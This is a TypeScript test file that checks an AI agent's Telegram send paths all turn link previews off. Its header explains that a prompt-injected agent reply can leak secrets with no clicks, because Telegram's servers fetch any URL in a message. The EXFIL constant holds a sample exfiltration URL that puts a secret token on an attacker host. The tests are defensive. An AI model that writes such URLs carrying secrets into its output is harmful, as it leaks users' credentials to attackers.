/**
 * #3231: every agent-authored Telegram send carries link previews off.
 *
 * With previews on, Telegram's servers fetch any URL in the text as soon as it
 * is sent: a prompt-injected reply with `https://evil/?q=<secret>` exfiltrates
 * with zero clicks. These tests read the real request body each send path
 * builds. fetch is replaced, so nothing leaves the box.
 */

import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { sendTelegram } from "../tools/actuators/notify";
import { NotificationDispatcher } from "./notifications";
import { TelegramDaemonBridge, tgSend } from "./telegram-bridge";

const EXFIL = "Here you go: https://attacker.example/?q=SECRET_TOKEN";

let bodies: Record<string, unknown>[] = [];
let throwFirst = false;
const realFetch = globalThis.fetch;

beforeEach(() => {
	bodies = [];
	throwFirst = false;
	globalThis.fetch = (async (_url: unknown, init?: { body?: string }) => {
		if (init?.body) bodies.push(JSON.parse(init.body));
		if (throwFirst) {
			throwFirst = false;
			throw new Error("markdown rejected");
		}
		return new Response(JSON.stringify({ ok: true, result: { message_id: 7 } }), {
			status: 200,
		});
	}) as unknown as typeof fetch;
});

afterEach(() => {
	globalThis.fetch = realFetch;
});

function expectPreviewOff(body: Record<string, unknown>) {
	expect(body.link_preview_options).toEqual({ is_disabled: true });
}

describe("telegram-bridge tgSend (agent stream replies)", () => {
	test("the sendMessage body disables link previews", async () => {
		await tgSend("t", "1", EXFIL);
		expect(bodies).toHaveLength(1);
		expect(bodies[0].text).toBe(EXFIL);
		expectPreviewOff(bodies[0]);
	});

	test("the plain-text retry also disables link previews", async () => {
		throwFirst = true;
		await tgSend("t", "1", EXFIL);
		expect(bodies).toHaveLength(2);
		for (const b of bodies) expectPreviewOff(b);
	});

	test("every chunk of a long reply disables link previews", async () => {
		await tgSend("t", "1", `${"line\n".repeat(1200)}${EXFIL}`);
		expect(bodies.length).toBeGreaterThan(1);
		for (const b of bodies) expectPreviewOff(b);
	});
});

describe("telegram-bridge class sends", () => {
	// originChatId is set as it is after the first inbound message: on an
	// idle bridge replyChat() recurses forever, tracked separately as #3206.
	const bridge = Object.assign(
		new TelegramDaemonBridge({
			telegramToken: "t",
			chatId: "1",
			daemonUrl: "ws://127.0.0.1:1",
			authorizedChatIds: ["1"],
		}),
		{ originChatId: "1" },
	) as unknown as {
		sendApprovalRequest(p: unknown): Promise<void>;
		sendTracked(text: string): Promise<number | null>;
		editTracked(id: number, text: string): Promise<void>;
	};

	test("the permission prompt (carries agent tool input) disables link previews", async () => {
		await bridge.sendApprovalRequest({ requestId: "r1", tool: "fetch", input: EXFIL });
		expect(bodies).toHaveLength(1);
		expectPreviewOff(bodies[0]);
	});

	test("boardroom tracked send and edit disable link previews", async () => {
		await bridge.sendTracked(EXFIL);
		await bridge.editTracked(7, EXFIL);
		expect(bodies).toHaveLength(2);
		for (const b of bodies) expectPreviewOff(b);
	});
});

describe("NotificationDispatcher", () => {
	test("notify disables link previews", async () => {
		await new NotificationDispatcher("t", "1").notify("task-progress", EXFIL);
		expect(bodies).toHaveLength(1);
		expectPreviewOff(bodies[0]);
	});

	test("notifyWithKeyboard disables link previews", async () => {
		await new NotificationDispatcher("t", "1").notifyWithKeyboard(EXFIL, [
			{ text: "ok", callback_data: "ok" },
		]);
		expect(bodies).toHaveLength(1);
		expectPreviewOff(bodies[0]);
	});
});

describe("notify actuator sendTelegram (an agent tool)", () => {
	test("disables link previews", async () => {
		const res = await sendTelegram("t", "1", EXFIL, {
			dryRun: false,
			requireConfirmation: false,
			allowedTargets: [],
		});
		expect(res.success).toBe(true);
		expect(bodies).toHaveLength(1);
		expectPreviewOff(bodies[0]);
	});
});
